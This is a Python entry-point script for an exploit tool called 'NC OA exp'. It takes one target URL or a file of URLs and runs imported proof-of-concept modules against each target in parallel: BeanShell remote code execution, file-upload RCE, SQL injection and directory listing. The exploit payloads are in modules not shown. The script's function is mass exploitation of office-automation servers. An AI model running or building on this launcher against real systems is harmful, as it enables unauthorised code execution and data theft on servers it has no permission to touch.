import argparse
import multiprocessing
from pyfiglet import Figlet
from rich.console import Console
from poc import nc_beanshell_rce,nc_upload_rce,nc_erp_sql,nc_u8_test_sql,nc_erp_directory

console = Console()


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    nc_beanshell_rce.main(target_url)
    nc_upload_rce.main(target_url)
    nc_u8_test_sql.main(target_url)
    nc_erp_sql.POC_1(target_url)
    nc_erp_directory.main(target_url)



if __name__ == '__main__':
    console.print(Figlet(font='slant').renderText('NC OA exp'), style='bold blue')
    console.print('         Author: iamzhaoxin    \n', style='bold blue')
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            if "http://" in args.url or "https://" in args.url:
                main(args.url)
            else:
                console.print('缺少HTTP头,例如：http://127.0.0.1')
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')
